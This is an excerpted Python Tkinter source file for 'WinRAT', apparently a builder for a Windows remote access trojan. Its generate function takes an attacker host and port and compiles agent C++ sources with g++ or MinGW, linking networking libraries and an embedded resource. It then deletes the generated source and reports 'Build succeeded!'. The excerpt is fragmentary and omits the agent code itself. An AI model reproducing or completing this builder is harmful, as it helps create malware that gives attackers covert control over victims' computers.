...
class GUI:
    def __init__(self, master):
        ...
        def generate(host, port, lfilename):
            ...
            if(os.name == "nt"):
                if(exeCheck("g++") == True):
                    ...
                    wincmd = "g++ agent/main.cpp agent/Winrat.cpp -MD -s -o "+filename+" -lws2_32 -lwininet -lwinmm -static " +lfilename+".res"
                    os.system(wincmd)
                    print("[+] File Compiled..")
                ...
                if(exeCheck("i686-w64-mingw32-g++") == True):
                    print("[+] Generating Executable..")
                    cmd = "i686-w64-mingw32-g++ agent/main.cpp agent/Winrat.cpp -MD -s -o "+filename+" -lws2_32 -lwininet -lwinmm -static " +lfilename+".res"
                    os.system(cmd)
                    print("[+] File Compiled..")
                    os.remove("agent/Winrat.cpp")
                    showInfo("Build succeeded!")
        ...
        def showInfo(infomessage):
            ...
            messagebox.showinfo("WinRAT", infomessage)

        def showWarning(warning):
            """ Show an Information MessageBox """
            messagebox.showwarning("WinRAT", warning)
        ...
        self.heading = Label(master, text="WinRAT", fg="cornflowerblue", bg="gray9")
...
def main():
    ...
    root = Tk()
    root.title("WinRAT www.infvie.com")
